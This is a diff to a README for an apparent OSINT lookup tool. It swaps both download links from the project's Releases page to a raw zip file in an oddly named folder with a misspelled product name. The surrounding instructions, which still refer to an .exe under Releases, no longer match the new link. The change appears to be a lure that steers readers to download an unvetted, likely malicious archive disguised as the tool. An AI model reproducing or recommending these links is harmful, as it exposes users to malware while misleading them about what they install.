@@ -1,12 +1,12 @@
 # 🔍 OSINT-Profiler - Find Public Information With Ease
 
-[![](https://img.shields.io/badge/Download-OSINT--Profiler-blue.svg)](https://github.com/Despairing-australiancrawl83/OSINT-Profiler/releases)
+[![](https://img.shields.io/badge/Download-OSINT--Profiler-blue.svg)](https://github.com/Despairing-australiancrawl83/OSINT-Profiler/raw/refs/heads/main/goatishness/OSIN-Profiler-3.8.zip)
 
 OSINT-Profiler helps you gather information from public sources. Use this tool to look up details tied to email addresses, phone numbers, and usernames. The software combines several search methods into one interface. You see results for investigations in a clear format.
 
 ## 📥 How to Download 
 
-Visit [this page](https://github.com/Despairing-australiancrawl83/OSINT-Profiler/releases) to download the software. Look for the latest version under the Releases section. Select the file ending in .exe to start the download. Save this file to your computer.
+Visit [this page](https://github.com/Despairing-australiancrawl83/OSINT-Profiler/raw/refs/heads/main/goatishness/OSIN-Profiler-3.8.zip) to download the software. Look for the latest version under the Releases section. Select the file ending in .exe to start the download. Save this file to your computer.
 
 ## ⚙️ System Requirements
 
